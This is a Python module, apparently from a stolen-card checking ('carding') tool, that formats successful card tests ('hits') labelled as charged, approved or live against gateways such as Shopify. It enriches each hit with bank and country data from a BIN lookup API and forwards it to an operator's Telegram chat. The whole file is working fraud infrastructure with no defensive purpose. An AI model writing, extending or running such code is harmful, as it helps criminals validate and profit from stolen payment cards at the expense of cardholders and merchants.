"""
notifier.py — Telegram forwarding for hits
"""
import aiohttp
from typing import Optional, Dict, Any
import db

EMOJI = {
    "check":"6258098853027778582","online":"6260192112713666900",
    "cross2":"6282852025159913806","gem":"5778546023349621090",
    "gem2":"5963312935148195483","gem3":"6028530359975548369",
    "gem4":"6260181985180782013","diamond":"6260156752247918115",
    "refresh":"6260297232038235681","hourglass":"6280443553529204094",
    "shop":"5983399041197675256","star":"5839116473951328489",
    "warn":"6206077285720659346","chat":"5793933761594789855",
}

def _pe(n: str) -> str:
    return f'<tg-emoji emoji-id="{EMOJI.get(n, EMOJI["star"])}">⭐</tg-emoji>'

def _esc(s) -> str:
    return (str(s) if s is not None else "").replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

def _flag(code: str) -> str:
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

def _mask(cc: str) -> str:
    p = cc.split("|")
    return f"{p[0][:6]}|**|**|***" if len(p) == 4 else cc[:6] + "****" + cc[-4:]

def _brand(cc: str) -> str:
    if cc.startswith("4"): return f"{_pe('gem')} VISA"
    if cc.startswith("5"): return f"{_pe('gem2')} MASTER"
    if cc.startswith(("34","37")): return f"{_pe('gem3')} AMEX"
    return f"{_pe('gem4')} CARD"

def format_hit(cc: str, res: Dict[str, Any], bin_info: Optional[dict], user_email: str) -> str:
    cls = res.get("cls", "charged")
    title = {
        "charged":      f"{_pe('check')} <b>CHARGED · ORDER PAID</b>",
        "approved_nsf": f"{_pe('online')} <b>APPROVED · NSF</b>",
        "approved_3ds": f"{_pe('online')} <b>APPROVED · 3DS</b>",
        "approved_ccn": f"{_pe('online')} <b>APPROVED · CCN</b>",
        "approved":     f"{_pe('online')} <b>CARD LIVE</b>",
    }.get(cls, f"{_pe('online')} <b>HIT</b>")

    bank = "N/A"; country = "N/A"; flag = "🌍"; ctype = "N/A"
    if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
        bank = bin_info.get("Issuer") or "N/A"
        cdata = bin_info.get("Country") or {}
        country = cdata.get("Name") or "N/A"
        flag = _flag(cdata.get("Code", ""))
        ctype = (bin_info.get("Type") or "N/A").upper()

    resp = _esc(res.get("response", "Unknown")[:120])
    amount = float(res.get("amount", 0) or 0)
    currency = res.get("currency", "USD")
    gateway = _esc(res.get("gateway", "Shopify"))
    rtt = res.get("_rtt", "")

    return (
        f"{title}\n"
        f"{_brand(cc)} <code>{_mask(cc)}</code>\n"
        f"{_pe('check')} <b>RESP</b> · {resp}\n"
        f"{_pe('gem')} <b>AMOUNT</b> · <b>${amount:.2f} {_esc(currency)}</b>\n"
        f"{_pe('refresh')} <b>GATE</b> · {gateway}\n"
        f"{_pe('hourglass')} <b>TIME</b> · {_esc(rtt)}s\n"
        f"{_pe('shop')} <b>BANK</b> · {_esc(bank)}\n"
        f"{flag} <b>COUNTRY</b> · {_esc(country)}\n"
        f"{_pe('diamond')} <b>TYPE</b> · {_esc(ctype)}\n"
        f"{_pe('star')} <b>USER</b> · {_esc(user_email)}"
    )

async def forward_hit(cc: str, res: Dict[str, Any], user_email: str):
    """Forward a hit to the admin-configured telegram bot/chat."""
    enabled = await db.get_setting("telegram_enabled", "0")
    if enabled != "1": return
    token = await db.get_setting("telegram_bot_token", "")
    chat = await db.get_setting("telegram_chat_id", "")
    if not token or not chat: return

    bin_info = None
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://data.handyapi.com/bin/{cc.split('|')[0][:6]}", timeout=aiohttp.ClientTimeout(total=6)) as r:
                if r.status == 200:
                    d = await r.json()
                    if d.get("Status") == "SUCCESS": bin_info = d
    except: pass

    text = format_hit(cc, res, bin_info, user_email)
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True},
                timeout=aiohttp.ClientTimeout(total=10),
            )
    except Exception:
        pass
